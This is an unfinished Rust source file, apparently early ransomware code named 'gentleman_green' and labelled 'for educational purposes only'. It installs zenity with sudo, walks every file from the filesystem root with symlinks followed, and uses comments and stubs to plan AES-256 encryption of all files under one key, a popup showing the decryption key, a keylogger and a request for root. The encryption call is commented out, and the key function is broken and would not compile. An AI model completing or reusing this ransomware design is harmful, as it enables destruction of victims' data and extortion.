use aes_gcm_siv::{Aes256GcmSiv, KeyInit, Nonce};
use rand_chacha::rand_core::{SeedableRng, RngCore};
use rand_chacha::ChaCha20Rng;
use std::fs::File;
use std::process::Command;
use std::{io, path::Path};
use walkdir::{DirEntry, Error, WalkDir}; //TODO: check the speed of this later
                                         //TODO: gonna need to add more later,
                                         // use aes-gcm-siv::{Aes256GcmSiv, aead::{Aead, KeyInit, Nonce}};
                                         // FOR EDUCATIONAL PURPOSES ONLY
                                         // build this for linux first and add windows stuff later??? might have time
                                         // name: gentleman_green

fn main() {
    //create a popup on linux systems
    check_requirements();
    find_files();
    //recursively find and encrypt all files
    display_message();
}

/**
 * check if the required resources are installed.
 * if not, install them
 */
fn check_requirements() {
    let cmd = Command::new("sh")
        .arg("-c")
        .arg("zenity")
        .output()
        .expect("zenity not installed");

    if !cmd.status.success() {
        //TODO: add more prints here later maybe for useability or maybe not
        //install zenity
        //
        println!("installing zenity");
        let install_cmd: std::process::Output = Command::new("sh")
            .arg("-c")
            .arg("sudo apt-get install zenity")
            .output()
            .expect("failed to install zenity");
    }
}

fn display_message() {
    //popup WITH THE DECRYPTION KEY ON THE POPUP
    //
}

/**
 * TODO: the initialization code for the cipher is here atm
 * idk if ill move it later
 *
 * Use AES-256
 * 
 * Notes: nonce is to make sure 2 identical plaintexts produce different output
 * counter is to make sure 2 identical blocks within the same plaintext produce different output
 */
fn generate_key() {
    //TODO: have this return the key
    let rng = ChaCha20Rng::from_entropy();
    let mut nonce_array = [0u8; 12];
    rng.fill_bytes(dest)//FIXME: up to here
    let key = Aes256GcmSiv::generate_key(rng);
    let cipher = Aes256GcmSiv::new(&key);
    //FIXME: understand references in rust
}

/**
 * find all the files in subdirectories.
 * follow symlinks, don't skip hidden files
 *
 * TODO: does this return anythign?
 */
fn find_files() -> Result<(), Error> {
    //return result
    //search recursively through all directories and find files

    //TODO: generate key here. one key to rule them all

    for entry in WalkDir::new("/").follow_links(true) {
        let entry: DirEntry = entry?;
        //iterate through all the files babey
        println!("found file: {}", entry.path().display());
        // encrypt(entry.path());
    }
    Ok(())
}

/**
 * file encryption done with aes gcm
 */
// fn encrypt(file_path: &Path, encryption_key: ) {//get a reference of the path
//     //decide which encryption scheme to use. SAME KEy
// }

fn decrypt() {
    //
}

fn keylogger() { //killswitch if user types please
                 //
}

fn root_check() { //
                  //if we dont have root. give popup: "may i plz have root 🥺👉🏽👈🏽"
}
